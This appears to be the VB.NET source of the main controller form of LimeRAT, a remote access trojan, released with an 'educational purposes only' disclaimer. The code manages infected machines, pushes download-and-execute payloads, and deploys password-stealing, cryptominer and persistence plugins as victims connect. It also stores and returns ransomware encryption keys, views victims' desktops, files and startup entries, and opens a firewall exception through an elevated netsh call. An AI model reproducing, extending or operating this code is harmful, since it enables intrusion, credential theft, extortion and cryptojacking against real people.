'##################################################################
'##        N Y A N   C A T  |||   Updated on Oct./20/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                           .. LimeRAT ..                      ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##            https://github.com/NYAN-x-CAT/Lime-RAT            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################

Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class Main

    Public WithEvents S As S_TcpListener
    Public Event Connected(ByVal sock As Integer)
    Public SPL = S_Settings.SPL


#Region "Form Events"

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        ' MetroLabel3.Text = Nothing
        Try : PingClients.Interval = My.Settings.PING_VALUE * 1000 : Catch : End Try
        Try : My.Computer.Audio.Play(My.Resources.Intro, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/

        Try
            If IO.File.Exists("MISC/USERS.dat") Then
                Dim BotList() As String = IO.File.ReadAllLines("MISC/USERS.dat")
                If BotList.Contains("<<#>>") Then
                    For Each line As String In BotList
                        Dim lineArray() As String = Split(line, "<<#>>")
                        Dim bot = L1.Items.Add(lineArray(0))
                        bot.ForeColor = Color.Red
                        For i As Integer = 1 To lineArray.Length - 1
                            bot.SubItems.Add(lineArray(i))
                        Next
                    Next
                    L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                End If
            End If
        Catch ex As Exception
        End Try

        Try
            S = New S_TcpListener(S_Settings.PORT)
        Catch ex As Exception
            MsgBox(ex.Message)
            End
        End Try

        BackgroundWorker1.RunWorkerAsync()

    End Sub

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        My.Settings.Save()

        Try
            Dim myWriter As New IO.StreamWriter("MISC/USERS.dat")
            Dim SPL As String = "<<#>>"
            For Each x As ListViewItem In L1.Items
                myWriter.WriteLine(x.Text & SPL & x.SubItems(1).Text & SPL & x.SubItems(2).Text & SPL _
                                   & x.SubItems(3).Text & SPL & x.SubItems(4).Text & SPL & x.SubItems(5).Text & SPL & x.SubItems(6).Text & SPL _
                                   & x.SubItems(7).Text & SPL & x.SubItems(8).Text & SPL & x.SubItems(9).Text & SPL & x.SubItems(10).Text & SPL & x.SubItems(11).Text & SPL & "Offline" & SPL & x.SubItems(12).Text)
            Next
            myWriter.Close()
        Catch ex As Exception
        End Try

        Try
            NotifyIcon1.Dispose()
            Application.Exit()
            End
        Catch : End Try
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Main_Rightclick.Renderer = New MyRenderer()

        Try
            Using WC As New Net.WebClient()
                Dim reply As String = WC.DownloadString("https://pastebin.com/raw/9kHA6nwH")
                If reply <> S_Settings.StubVer Then
                    Messages("{ New update is available! }", "github.com/NYAN-x-CAT/Lime-RAT/releases")
                ElseIf reply = S_Settings.StubVer Then
                    Messages("{ You are using the latest version! }", "Found bug? Email NYANxCAT@pm.me")
                End If
                WC.Dispose()
            End Using
        Catch ex As Exception
        End Try


        Dim Client As Net.Sockets.TcpClient = Nothing
        Dim PortLabel As New Text.StringBuilder
        For Each ThePort In S_Settings.PORT
            Try
                If GetExternalAddress() = "127.0.0.1" Then
                    PortLabel.Append(String.Format(" {0}=OPENED ", ThePort))
                    MetroLabel3.Text = String.Format("IP={0} {1} KEY={2}", GetExternalAddress, PortLabel.ToString, S_Settings.EncryptionKey)
                    MetroLabel3.ForeColor = Color.Lime
                Else
                    Client = New Net.Sockets.TcpClient
                    Client.Connect(GetExternalAddress, ThePort)
                    PortLabel.Append(String.Format(" {0}=OPENED ", ThePort))
                    MetroLabel3.Text = String.Format("IP={0} {1} KEY={2}", GetExternalAddress, PortLabel.ToString, S_Settings.EncryptionKey)
                    MetroLabel3.ForeColor = Color.Lime
                End If
            Catch ex As Net.Sockets.SocketException
                MetroProgressSpinner1.Spinning = False
                PortLabel.Append(String.Format(" {0}=CLOSED ", ThePort))
                MetroLabel3.Text = String.Format("IP={0}  {1}  KEY={2}", GetExternalAddress, PortLabel.ToString, S_Settings.EncryptionKey)
                MetroLabel3.ForeColor = Color.Red
                Try : My.Computer.Audio.Play(Application.StartupPath + "\Misc\Error.wav", AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/

                If GTV("FW") = Nothing Then
                    Dim result As DialogResult = MessageBox.Show("Port " & ThePort & " seems to be blocked" + Environment.NewLine + "Do you want to add LimeRAT into firewall exception", "", MessageBoxButtons.YesNo)
                    If result = DialogResult.Yes Then
                        Try
                            STV("FW", "1")
                            Dim process As New Process()
                            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                            process.StartInfo.FileName = "cmd.exe"
                            process.StartInfo.UseShellExecute = True
                            process.StartInfo.Verb = "runas"
                            process.StartInfo.Arguments = "/c netsh advfirewall firewall add rule name=""LimeRAT"" dir=in action=allow program=""" & Application.ExecutablePath & """ enable=yes"
                            process.Start()
                            process.WaitForExit()
                            Process.Start(Application.ExecutablePath)
                            End
                        Catch ex1 As Exception
                        End Try
                    End If
                End If
            Finally
                Try : Client.Close() : Catch : End Try
            End Try
        Next

    End Sub


#End Region


#Region "Server Events"
    Private Sub S_Disconnected(ByVal u As Integer) Handles S.DisConnected
        SyncLock L1.Items
            Try
                For i As Integer = 0 To L1.Items.Count - 1
                    If L1.Items(i).Tag = u Then
                        L1.Items(i).ForeColor = Color.Red
                        L1.Items(i).SubItems(PING.Index).Text = "Offline"
                        L1.Items(i).Tag = Nothing
                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        Messages("{" + S.IP(u) + "}", "Disconnected")
                        Exit For
                    End If
                Next
            Catch ex As Exception
            End Try
        End SyncLock
    End Sub

    Private Sub Dicconnction_Tick(sender As Object, e As EventArgs) Handles Dicconnction.Tick
        For Each x As ListViewItem In L1.Items
            If x.SubItems(PING.Index).Text = "Offline" Then
                x.Remove()
            End If
        Next
    End Sub

    Public List_PWD As New List(Of String)
    Public List_DE As New List(Of String)
    Public List_MINER As New List(Of String)
    Public List_PERS As New List(Of String)
    Public CHK_PWD As Boolean = False
    Public PathEXE As String = ""
    Public CHK_DE As Boolean = False
    Public _MINER_SETTINGS As String = ""
    Public CHK_MINER As Boolean = False
    Public CHK_PERS As Boolean = False
    Private Sub S_Connected(ByVal u As Integer) Handles Me.Connected
        Try

            Messages("{" + S.IP(u) + "}", "Connected")

            If CHK_DE AndAlso IO.File.Exists(PathEXE) AndAlso Not List_DE.Contains(S.IP(u)) Then
                Dim MS As New IO.MemoryStream
                Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
                Dim F = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(PathEXE), True))
                Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "RD-|'P'|" + IO.Path.GetFileName(PathEXE) + "|'P'|" + F))
                MS.Write(CMD, 0, CMD.Length)
                S.SendData(u, MS.ToArray)
                MS.Dispose()
                List_DE.Add(S.IP(u))
                Messages(S.IP(u), "On Connect: Download and Execute " + IO.Path.GetFileName(PathEXE))
            End If

            If CHK_PWD = True AndAlso Not List_PWD.Contains(S.IP(u)) Then
                S.Send(u, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll")))
                List_PWD.Add(S.IP(u))
                Messages(S.IP(u), "On Connect: PWD")
            End If

            If CHK_MINER = True AndAlso Not List_MINER.Contains(S.IP(u)) Then
                S.Send(u, _MINER_SETTINGS)
                List_MINER.Add(S.IP(u))
                Messages(S.IP(u), "On Connect: MINER")
            End If

            If CHK_PERS = True AndAlso Not List_PERS.Contains(S.IP(u)) Then
                S.Send(u, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PERS.dll"), True)) + SPL + " ")
                List_PERS.Add(S.IP(u))
                Messages(S.IP(u), "On Connect: Persistence")
            End If

        Catch ex As Exception
            Messages(S.IP(u), ex.Message)
        End Try
    End Sub



#End Region


#Region "Client Commands"
    Private Shared _Gio As New S_GeoIP(Application.StartupPath & "\Misc\GeoIP.dat")
    Delegate Sub _Data(ByVal u As Integer, ByVal B As Byte())
    Sub Data(ByVal u As Integer, ByVal B As Byte()) Handles S.Data

        Dim A As String() = Split(S_Encryption.AES_Decrypt(BS(B)), S_Settings.SPL)
        Try
            Select Case A(0)

#Region "Add to L1"

                Case "info"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If
                    SyncLock L1.Items
                        For i As Integer = 0 To L1.Items.Count - 1
                            If L1.Items(i).SubItems(ID.Index).Text = A(1) AndAlso L1.Items(i).SubItems(USERN.Index).Text = A(2) Then
                                L1.Items(i).Tag = u
                                L1.Items(i).ImageKey = _Gio.LookupCountryCode(S.IP(u)) & ".png"
                                L1.Items(i).SubItems(IP.Index).Text = S.IP(u)
                                L1.Items(i).SubItems(ID.Index).Text = A(1)
                                L1.Items(i).SubItems(USERN.Index).Text = A(2)
                                L1.Items(i).SubItems(VER.Index).Text = A(3)
                                L1.Items(i).SubItems(OS.Index).Text = A(4)
                                L1.Items(i).SubItems(INSDATE.Index).Text = A(5)
                                L1.Items(i).SubItems(AV.Index).Text = A(6)
                                L1.Items(i).SubItems(RANS.Index).Text = A(7)
                                L1.Items(i).SubItems(XMR.Index).Text = A(8)
                                L1.Items(i).SubItems(SP.Index).Text = A(9)
                                L1.Items(i).SubItems(_PORT.Index).Text = A(10)
                                L1.Items(i).SubItems(DotNET.Index).Text = A(11)
                                L1.Items(i).SubItems(PING.Index).Text = "Online"
                                L1.Items(i).ForeColor = Nothing
                                L1.Items(i).ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(14), A(15))
                                Messages("{" + S.IP(u) + "}", "Reconnected")

                                Try
                                    If GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Color") IsNot Nothing Then
                                        L1.Items(i).ForeColor = ColorTranslator.FromHtml(GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Color"))
                                    End If

                                    If GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Note") IsNot Nothing Then
                                        L1.Items(i).SubItems(NOTE_.Index).Text = GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Note")
                                    End If
                                Catch ex As Exception
                                End Try
                                L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                                Exit Select
                            End If
                        Next

                        ''''

                        Dim L = L1.Items.Add(_Gio.LookupCountryName(S.IP(u)), _Gio.LookupCountryCode(S.IP(u)) & ".png")
                        L.Tag = u
                        Try : L.ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(14), A(15)) : Catch : End Try
                        L.SubItems.Add(S.IP(u))

                        For i As Integer = 1 To A.Length - 1
                            If i = 15 Then Exit For
                            L.SubItems.Add(A(i))
                        Next

                        Try
                            If GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Color") IsNot Nothing Then
                                L.ForeColor = ColorTranslator.FromHtml(GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Color"))
                            End If

                            If GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Note") IsNot Nothing Then
                                L.SubItems(NOTE_.Index).Text = GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Note")
                            End If
                        Catch ex As Exception
                        End Try

                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

                        If MetroToggle1.Checked = True Then
                            NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
                            NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + S.IP(u)
                            NotifyIcon1.BalloonTipTitle = "LimeRAT | New Connection!"
                            NotifyIcon1.ShowBalloonTip(600)
                        End If
                    End SyncLock
                    RaiseEvent Connected(u)
                    Exit Select

#End Region

#Region "Update L1"

                Case "!PStart"
                    S.Send(u, "!P")

                Case "!P"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If
                    SyncLock L1.Items
                        For i As Integer = 0 To L1.Items.Count - 1
                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
                                L1.Items.Item(i).SubItems(PING.Index).Text = A(1).ToString
                                Exit For
                            End If
                        Next
                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    End SyncLock
                    Exit Select


                Case "!R"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If
                    SyncLock L1.Items
                        For i As Integer = 0 To L1.Items.Count - 1
                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
                                L1.Items.Item(i).SubItems(RANS.Index).Text = A(1).ToString
                                Exit For
                            End If
                        Next
                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    End SyncLock
                    Exit Select

                Case "!SP"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If
                    SyncLock L1.Items
                        For i As Integer = 0 To L1.Items.Count - 1
                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
                                If A(1).ToString.Contains("Spreaded!") Then
                                    L1.Items.Item(i).BackColor = Color.DarkGreen
                                    L1.Items.Item(i).SubItems(SP.Index).Text = "Just Spreaded!"
                                Else
                                    L1.Items.Item(i).SubItems(SP.Index).Text = A(1).ToString
                                End If
                                Exit For
                            End If
                        Next
                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    End SyncLock
                    Exit Select

                Case "!X"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If
                    SyncLock L1.Items
                        For i As Integer = 0 To L1.Items.Count - 1
                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
                                L1.Items.Item(i).SubItems(XMR.Index).Text = A(1).ToString
                                Exit For
                            End If
                        Next
                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    End SyncLock
                    Exit Select

                Case "OK"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    SyncLock L1.Items
                        For i As Integer = 0 To L1.Items.Count - 1
                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(1).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(2).ToString Then
                                L1.Items.Item(i).BackColor = Nothing
                                Exit For
                            End If
                        Next
                    End SyncLock
                    Exit Select

#End Region

#Region "Remote Desktop"

                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + A(1))

                    If _RDP Is Nothing Then
                        _RDP = New Remote_Desktop
                        _RDP.M = Me
                        _RDP.U = u
                        _RDP.Name = "!" + A(1)
                        _RDP.Sz = New Size(A(2), A(3))
                        _RDP.Text = "Remote Desktop - " & S.IP(u)
                        _RDP.BOT = A(1)
                        _RDP.Show()
                    End If
                    Exit Select

                Case "@" ' i recive image  
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If
                    Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + A(1))
                    If _RDP IsNot Nothing Then
                        If A(2).Length = 1 Then
                            If _RDP.MetroButton1.Text = "Stop" Then
                                S.Send(u, "@" & SPL & _RDP.Combo_size.SelectedIndex & SPL & _RDP.C2 & SPL & _RDP.Combo_quality.SelectedItem)
                            End If
                            Exit Sub
                        End If
                        _RDP.PktToImage(System.Text.Encoding.Default.GetBytes(A(2)))
                    End If
                    Exit Select
#End Region

#Region "Password Recovery"

                Case "PWD+"

                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Dim Pass As Pass_Recovery = My.Application.OpenForms("PWD")
                    If Pass Is Nothing AndAlso PW_F = True Then
                        Pass = New Pass_Recovery
                        Pass.M = Me
                        Pass.U = u
                        Pass.Name = "PWD"
                        Pass.Text = " Passwords"
                        Pass.Show()
                    End If

                    'duplicate 
                    Try
                        For Each listItem As ListViewItem In Pass.L1.Items
                            If listItem.SubItems.Item(0).Text.TrimStart.TrimEnd = A(2) Then
                                Exit Select
                            End If
                        Next
                    Catch ex As Exception
                    End Try

                    Try
                        Dim aa As String() = Split(A(1), "~|~")
                        For i = 2 To aa.Length
                            Dim ii As New ListViewItem
                            ii.Text = aa(i)
                            ii.SubItems.Add(aa(i + 2))
                            ii.SubItems.Add(aa(i + 4))
                            ii.SubItems.Add(aa(i + 6))
                            ii.SubItems.Add(aa(i + 8))
                            Pass.L1.Items.Add(ii)
                            i += 9
                        Next
                    Catch ex As Exception
                    End Try

                    IO.File.WriteAllText(uFolder(A(2), "PASS.txt"), A(1))
                    Exit Select
#End Region

#Region "System Manager"

                Case "SysInfo"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(20))
                    If sys Is Nothing Then
                        sys = New System_Manager
                        sys.M = Me
                        sys.U = u
                        sys.Name = "Info" + A(20)
                        sys.Text = "System Manager " + S.IP(u)
                        sys.Show()
                    End If

                    Dim GW As New ListViewGroup("Windows", HorizontalAlignment.Left)
                    Dim GU As New ListViewGroup("User", HorizontalAlignment.Left)
                    Dim GS As New ListViewGroup("Specifications", HorizontalAlignment.Left)
                    Dim GL As New ListViewGroup("Client", HorizontalAlignment.Left)
                    Dim GM As New ListViewGroup("MISC", HorizontalAlignment.Left)

                    Try
                        With sys.ListView1
                            .Clear()
                            .FullRowSelect = True
                            .View = View.Details
                            .Columns.Add("")
                            .Columns.Add("")
                            .HeaderStyle = ColumnHeaderStyle.None

                            .Groups.Add(GU)
                            .Groups.Add(GW)
                            .Groups.Add(GS)
                            .Groups.Add(GL)
                            .Groups.Add(GM)
                        End With
                    Catch ex As Exception
                    End Try

                    With sys.ListView1.Items
                        .Add(New ListViewItem("Computer Name: ", GU)).SubItems.Add(A(1))

                        .Add(New ListViewItem("User Name: ", GU)).SubItems.Add(A(2))
                        .Add(New ListViewItem("Client ID: ", GU)).SubItems.Add(A(20))


                        .Add(New ListViewItem("Windows Name: ", GW)).SubItems.Add(A(4))
                        .Add(New ListViewItem("Windows Version: ", GW)).SubItems.Add(A(5))
                        .Add(New ListViewItem("Windows Architecture: ", GW)).SubItems.Add(A(6))
                        .Add(New ListViewItem("Product Key: ", GW)).SubItems.Add(A(7))


                        .Add(New ListViewItem("Machine Type: ", GS)).SubItems.Add(A(17))
                        .Add(New ListViewItem("DotNET Framework: ", GS)).SubItems.Add(A(18))
                        .Add(New ListViewItem("CPU Name: ", GS)).SubItems.Add(A(8))
                        .Add(New ListViewItem("GPU Name: ", GS)).SubItems.Add(A(9))
                        .Add(New ListViewItem("RAM: ", GS)).SubItems.Add(A(10))
                        .Add(New ListViewItem("Screen: ", GS)).SubItems.Add(A(11))
                        .Add(New ListViewItem("Fixed Drivers: ", GS)).SubItems.Add(A(19))
                        .Add(New ListViewItem("Removable Drivers: ", GS)).SubItems.Add(A(23))

                        .Add(New ListViewItem("Pastebin URL: ", GL)).SubItems.Add(A(24))
                        .Add(New ListViewItem("HOST: ", GL)).SubItems.Add(A(12))
                        .Add(New ListViewItem("PORT: ", GL)).SubItems.Add(A(13))
                        .Add(New ListViewItem("Privilege: ", GL)).SubItems.Add(A(3))
                        .Add(New ListViewItem("Location: ", GL)).SubItems.Add(A(14))

                        .Add(New ListViewItem("Active Window: ", GM)).SubItems.Add("{ " & A(21) & " }")
                        .Add(New ListViewItem("Last Reboot: ", GM)).SubItems.Add(A(15))
                        .Add(New ListViewItem("Anti-Virus: ", GM)).SubItems.Add(A(16))
                        .Add(New ListViewItem("Firewall: ", GM)).SubItems.Add(A(22))
                    End With

                    sys.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Exit Select

                Case "PROC"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If
                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(3))
                    If sys IsNot Nothing Then

                        Try
                            With sys.L2
                                .Clear()
                                .View = View.Details
                                .Columns.Add("Process name", 250)
                                .Columns.Add("Process ID", 80)
                                .Columns.Add("Process path", 250)
                                .GridLines = True
                            End With
                        Catch ex As Exception
                        End Try

                        Try
                            Dim PR As String() = Split(A(1), "|'P'|")
                            For i As Integer = 0 To PR.Length
                                With sys.L2.Items.Add(PR(i))
                                    .SubItems.Add(PR(i + 1))
                                    .SubItems.Add(PR(i + 2))
                                    i += 2
                                End With
                            Next
                        Catch ex1 As Exception
                        End Try

                        Try
                            For Each x As ListViewItem In sys.L2.Items
                                If x.SubItems(2).Text = A(2) Then
                                    x.ForeColor = Color.FromArgb(142, 188, 0)
                                End If
                            Next
                        Catch ex2 As Exception
                        End Try
                    End If

                    sys.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Exit Select

                Case "STUP"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If
                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(9))
                    If sys IsNot Nothing Then
                        Dim G1 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G2 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\", HorizontalAlignment.Left)
                        Dim G3 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\", HorizontalAlignment.Left)
                        Dim G4 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G8 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G6 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", HorizontalAlignment.Left)
                        Dim G5 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", HorizontalAlignment.Left)
                        Dim G7 As New ListViewGroup("Startup Folder", HorizontalAlignment.Left)

                        Try
                            With sys.L3
                                .Clear()
                                .View = View.Details
                                .HeaderStyle = ColumnHeaderStyle.None
                                .Columns.Add("")
                                .Columns.Add("")
                                .GridLines = True
                                .Groups.Add(G1)
                                .Groups.Add(G2)
                                .Groups.Add(G3)
                                .Groups.Add(G4)
                                .Groups.Add(G8)
                                .Groups.Add(G6)
                                .Groups.Add(G5)
                                .Groups.Add(G7)
                                .ShowGroups = True
                                .FullRowSelect = True
                            End With
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(1), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G1)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(2), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G2)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(3), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G3)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(4), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G4)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(8), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G8)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(6), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G6)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(5), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G5)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(7), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G7)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        sys.L3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    End If
                    Exit Select

#End Region

#Region "Ransomware"

                Case "Key"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    IO.File.WriteAllText(uFolder(A(1), "KEY.txt"), A(2))
                    Exit Select

                Case "SC"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    IO.File.WriteAllBytes(uFolder(A(1), "SC.jpeg"), Convert.FromBase64String(A(2)))
                    Exit Select

                Case "DEC"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    S.Send(u, "DEC" + SPL + IO.File.ReadAllText(uFolder(A(1), "KEY.txt")))
                    Exit Select

                Case "ENC"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    S.Send(u, "ENC" + SPL + RANS_TEXT + SPL + RANS_IMG)
                    Exit Select
#End Region

#Region "File Manager"
                Case "OFM"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" + A(1))
                    If FM Is Nothing Then
                        FM = New File_Manager
                        FM.M = Me
                        FM.U = u
                        FM.Name = "FM" + A(1)
                        FM.Text = "File Manager " + S.IP(u)
                        FM.Show()
                    End If
                    Exit Select

                Case "FM"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then


                        If A(2) = "Error " Then
                            FM.BackToolStripMenuItem.PerformClick()
                            FM.Label2.Text = A(3)
                            Return
                        Else
                            FM.L1.Items.Clear()
